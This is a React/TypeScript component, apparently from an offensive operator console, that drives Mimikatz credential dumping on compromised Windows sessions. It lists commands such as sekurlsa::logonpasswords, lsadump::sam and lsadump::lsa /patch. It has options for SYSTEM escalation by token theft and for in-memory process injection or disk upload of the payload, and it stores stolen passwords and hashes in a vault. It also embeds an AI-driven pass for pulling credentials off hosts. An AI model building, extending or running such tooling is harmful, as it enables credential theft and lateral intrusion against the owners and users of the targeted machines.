import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { useTranslation } from 'react-i18next'
import { api } from '../../lib/api'
import type { MimikatzMode, MimikatzResult } from '../../lib/types'
import { useToast } from '../common/Toast'
import AITab from './AITab'

/** The sekurlsa/lsadump/vault commands an operator reaches for, in the order
 *  they are usually tried: logon passwords first, then the narrower providers,
 *  then local SAM/LSA secrets and finally the patched-LSA fallback. */
const COMMANDS = [
  'sekurlsa::logonpasswords',
  'sekurlsa::msv',
  'sekurlsa::wdigest',
  'sekurlsa::kerberos',
  'sekurlsa::tspkg',
  'lsadump::sam',
  'lsadump::secrets',
  'vault::cred',
  'lsadump::lsa /patch',
]

/** An inline SVG spinner so the component needs no extra stylesheet rule. */
function Spinner() {
  return (
    <svg width="13" height="13" viewBox="0 0 24 24" aria-hidden="true" style={{ verticalAlign: '-2px' }}>
      <circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" strokeWidth="3" opacity="0.25" />
      <path d="M21 12a9 9 0 0 0-9-9" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round">
        <animateTransform
          attributeName="transform"
          type="rotate"
          from="0 12 12"
          to="360 12 12"
          dur="0.8s"
          repeatCount="indefinite"
        />
      </path>
    </svg>
  )
}

function kindTone(kind: string): string {
  const k = (kind || '').toLowerCase()
  if (k.includes('password') || k.includes('plain')) return 'green'
  if (k.includes('hash') || k.includes('ntlm')) return 'yellow'
  return 'gray'
}

/**
 * HarvestTab runs a credential-dumping command inside the session and shows
 * what came back.
 *
 * Runs are measured in minutes, so the button reports elapsed seconds while it
 * is in flight - an operator needs to distinguish "still dumping" from "the
 * agent stopped answering". Output can also be pasted in from elsewhere and
 * parsed without a session round trip.
 */
export default function HarvestTab({ sessionId }: { sessionId: string }) {
  const { t } = useTranslation()
  const toast = useToast()

  const [command, setCommand] = useState(COMMANDS[0])
  const [autoAdd, setAutoAdd] = useState(true)
	// Escalating to SYSTEM is what makes the sekurlsa and lsadump modules work at
	// all on an unelevated session, so it defaults on.
	const [elevate, setElevate] = useState(true)
	const [hostingProcess, setHostingProcess] = useState('')
	// Auto is the default because it is the only mode that cannot fail for a
	// reason the operator has to understand: it uses the in-memory route when the
	// payload allows it and writes to disk when it does not. The two explicit
	// modes exist for the runs where that trade-off is the operator's to make.
	const [mode, setMode] = useState<MimikatzMode>('auto')
	const [injectionHost, setInjectionHost] = useState('')
  const [running, setRunning] = useState(false)
  const [elapsed, setElapsed] = useState(0)
  const [result, setResult] = useState<MimikatzResult | null>(null)
  const [error, setError] = useState('')

  const [pasteText, setPasteText] = useState('')
  const [parsing, setParsing] = useState(false)
  const [adding, setAdding] = useState(false)

  // Elapsed seconds tick while a run is in flight; the interval is torn down as
  // soon as the promise settles.
  const startedAt = useRef(0)
  useEffect(() => {
    if (!running) return
    const timer = setInterval(() => {
      setElapsed(Math.round((Date.now() - startedAt.current) / 1000))
    }, 1000)
    return () => clearInterval(timer)
  }, [running])

  const parsed = useMemo(() => result?.parsed || [], [result])

  const run = useCallback(async () => {
    setRunning(true)
    setError('')
    startedAt.current = Date.now()
    setElapsed(0)
    try {
			const res = await api.mimikatz(
				sessionId,
				command,
				autoAdd,
				elevate,
				hostingProcess.trim() || undefined,
				mode,
				injectionHost.trim() || undefined,
			)
      setResult(res)
      if (res.message) toast.push(res.ok ? 'success' : 'error', res.message)
      else if (res.added > 0) toast.push('success', t('harvest.addedOk', { count: res.added }))
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setRunning(false)
    }
  }, [sessionId, command, autoAdd, elevate, hostingProcess, mode, injectionHost, t, toast])

  const parsePasted = async () => {
    if (!pasteText.trim()) {
      setError(t('harvest.needText'))
      return
    }
    setParsing(true)
    setError('')
    try {
      const res = await api.mimikatzParse(pasteText, autoAdd)
      setResult(res)
      toast.push('success', t('harvest.parsedOk', { count: res.parsed?.length || 0 }))
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setParsing(false)
    }
  }

  // Only offered when the run did not already store what it found.
  const addToVault = async () => {
    setAdding(true)
    setError('')
    try {
      const res = await api.mimikatzParse(result?.raw || '', true)
      setResult(res)
      toast.push('success', t('harvest.addedOk', { count: res.added }))
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setAdding(false)
    }
  }

  return (
    <>
      <div className="card">
        <div className="card-title">{t('harvest.title')}</div>
        <p className="page-sub" style={{ marginBottom: 12 }}>
          {t('harvest.hint')}
        </p>

        <div className="pf-form">
          <div className="field" style={{ flex: 2 }}>
            <label htmlFor="harvest-command">{t('harvest.command')}</label>
            <select id="harvest-command" value={command} onChange={(e) => setCommand(e.target.value)}>
              {COMMANDS.map((c) => (
                <option key={c} value={c}>
                  {c}
                </option>
              ))}
            </select>
          </div>
          <div className="field">
            <label htmlFor="harvest-auto-add" style={{ display: 'flex', gap: 8, alignItems: 'center', cursor: 'pointer' }}>
              <input id="harvest-auto-add" type="checkbox" checked={autoAdd} onChange={(e) => setAutoAdd(e.target.checked)} />
              {t('harvest.autoAdd')}
            </label>
          </div>
          <div className="field">
            <label htmlFor="harvest-elevate" style={{ display: 'flex', gap: 8, alignItems: 'center', cursor: 'pointer' }}>
              <input id="harvest-elevate" type="checkbox" checked={elevate} onChange={(e) => setElevate(e.target.checked)} />
              {t('harvest.elevate')}
            </label>
          </div>
			{/* The escalation host is a different thing from the injection host: one
				 is the SYSTEM process the token is stolen from, the other is where the
				 payload runs. Both are optional and both fall back to a server default. */}
			{elevate && (
				<div className="field">
					<label htmlFor="harvest-hosting">{t('harvest.hostingProcess')}</label>
					<input
						id="harvest-hosting"
						value={hostingProcess}
						onChange={(e) => setHostingProcess(e.target.value)}
						placeholder={t('harvest.hostingProcessHint')}
					/>
				</div>
			)}
          <div className="field">
            <label htmlFor="harvest-mode">{t('harvest.mode')}</label>
            <select
              id="harvest-mode"
              value={mode}
              onChange={(e) => setMode(e.target.value as MimikatzMode)}
            >
              <option value="auto" title={t('harvest.modeAutoHint')}>{t('harvest.modeAuto')}</option>
              <option value="memory" title={t('harvest.modeMemoryHint')}>{t('harvest.modeMemory')}</option>
              <option value="upload" title={t('harvest.modeUploadHint')}>{t('harvest.modeUpload')}</option>
            </select>
          </div>
			{/* Only an in-memory run needs a host process; the upload path starts
				 the payload itself and names a binary, not a process. */}
			{mode !== 'upload' && (
				<div className="field">
					<label htmlFor="harvest-host">{t('harvest.process')}</label>
					<input
						id="harvest-host"
						value={injectionHost}
						onChange={(e) => setInjectionHost(e.target.value)}
						placeholder={t('harvest.processHint')}
					/>
				</div>
			)}
          <div className="field" style={{ justifyContent: 'flex-end' }}>
            <button type="button" className="btn primary" onClick={run} disabled={running || !command}>
              {running ? (
                <>
                  <Spinner /> {t('harvest.elapsed', { seconds: elapsed })}
                </>
              ) : (
                t('harvest.run')
              )}
            </button>
          </div>
        </div>

        <p className="page-sub" style={{ margin: 0 }}>
          {t('harvest.slowHint')}
        </p>

        {error && <div className="error-banner" style={{ marginTop: 12 }}>{error}</div>}

        {result && (
          <div style={{ marginTop: 14 }}>
            <div className="card-title" style={{ marginBottom: 8 }}>
              {t('harvest.results')} ({parsed.length})
              {result.exitCode !== 0 && (
                <span className="badge red" style={{ marginLeft: 8 }}>
                  {t('harvest.exitCode', { code: result.exitCode })}
                </span>
              )}
            </div>

            {/*
              The diagnosis is the point of this panel. "0 credentials" on its
              own cannot distinguish "this host has none" from "the token could
              not open LSASS", and those need opposite next steps.
            */}
            {result.message && (
              <div className={result.ok ? 'alert' : 'alert error'} style={{ marginBottom: 8 }}>
                {result.message}
              </div>
            )}

			{/* What the run did to the host, not just what it found. Whether a file
				 was written is the difference between a run an operator can walk away
				 from and one that needs cleaning up, so it is stated rather than left to
				 be inferred from the raw output. */}
			{(result.elevated || result.integrity || result.mode) && (
				<div style={{ display: 'flex', gap: 8, marginBottom: 8, flexWrap: 'wrap' }}>
					{result.mode && (
						<span
							className={`badge ${result.mode === 'memory' ? 'green' : 'gray'}`}
							title={result.execution || undefined}
						>
							{t('harvest.mode')}: {t(`harvest.mode${result.mode === 'memory' ? 'Memory' : 'Upload'}`)}
						</span>
					)}
					{result.integrity && (
						<span
							className={`badge ${result.elevated ? 'green' : 'yellow'}`}
							title={t('harvest.integrityHint')}
						>
							{t('harvest.integrity', { level: result.integrity })}
						</span>
					)}
					{result.elevated && (
						<span className="badge green">{t('harvest.escalated')}</span>
					)}
					{result.execution && (
						<span className="page-sub" style={{ margin: 0 }}>{result.execution}</span>
					)}
				</div>
			)}

            <table className="data">
              <thead>
                <tr>
                  <th>{t('harvest.thUser')}</th>
                  <th>{t('harvest.thDomain')}</th>
                  <th>{t('harvest.thSecret')}</th>
                  <th>{t('harvest.thKind')}</th>
                  <th>{t('harvest.thSource')}</th>
                </tr>
              </thead>
              <tbody>
                {parsed.length === 0 && (
                  <tr>
                    <td className="empty" colSpan={5}>
                      {t('harvest.noCreds')}
                    </td>
                  </tr>
                )}
                {parsed.map((c, i) => (
                  <tr key={`${c.username}-${c.kind}-${i}`}>
                    <td>{c.username || '-'}</td>
                    <td>{c.domain || '-'}</td>
                    <td className="mono" style={{ maxWidth: 320, overflow: 'hidden', textOverflow: 'ellipsis' }}>
                      {c.secret || '-'}
                    </td>
                    <td>
                      <span className={`badge ${kindTone(c.kind)}`}>{c.kind || '-'}</span>
                    </td>
                    <td className="mono" style={{ fontSize: 12, opacity: 0.75 }}>
                      {c.source || '-'}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>

            <div className="toolbar" style={{ marginTop: 10 }}>
              {/* Only needed when the run was not asked to store what it found. */}
              {!autoAdd && parsed.length > 0 && (
                <button type="button" className="btn sm" disabled={adding} onClick={addToVault}>
                  {adding ? t('harvest.saving') : t('harvest.addToVault', { count: parsed.length })}
                </button>
              )}
              {result.added > 0 && (
                <span className="page-sub" style={{ margin: 0 }}>
                  {t('harvest.addedOk', { count: result.added })}
                </span>
              )}
            </div>

            <details style={{ marginTop: 10 }}>
              <summary style={{ cursor: 'pointer', fontSize: 13 }}>{t('harvest.raw')}</summary>
              <pre className="viewer-pre mono" style={{ marginTop: 8, maxHeight: 360, overflow: 'auto' }}>
                {result.raw || t('harvest.noOutput')}
              </pre>
            </details>
          </div>
        )}
      </div>

      <div className="card" style={{ marginTop: 14 }}>
        <div className="card-title">{t('harvest.pasteTitle')}</div>
        <p className="page-sub" style={{ marginBottom: 12 }}>
          {t('harvest.pasteHint')}
        </p>
        <textarea
          className="input mono"
          rows={8}
          style={{ width: '100%' }}
          placeholder={t('harvest.pastePlaceholder')}
          value={pasteText}
          onChange={(e) => setPasteText(e.target.value)}
        />
        <div className="toolbar" style={{ marginTop: 10 }}>
          <button type="button" className="btn primary" onClick={parsePasted} disabled={parsing}>
            {parsing ? t('common.working') : t('harvest.parse')}
          </button>
          <span className="page-sub" style={{ margin: 0 }}>
            {autoAdd ? t('harvest.parseAutoAdd') : t('harvest.parseNoAdd')}
          </span>
        </div>
      </div>

      {/* The AI collection pass lives in this tab rather than its own: it is
          the same job as the dump above -- get credentials off the host -- and
          an operator picks between the two here instead of hunting for the
          other tab. */}
      <div style={{ marginTop: 14 }}>
        <AITab sessionId={sessionId} />
      </div>
    </>
  )
}
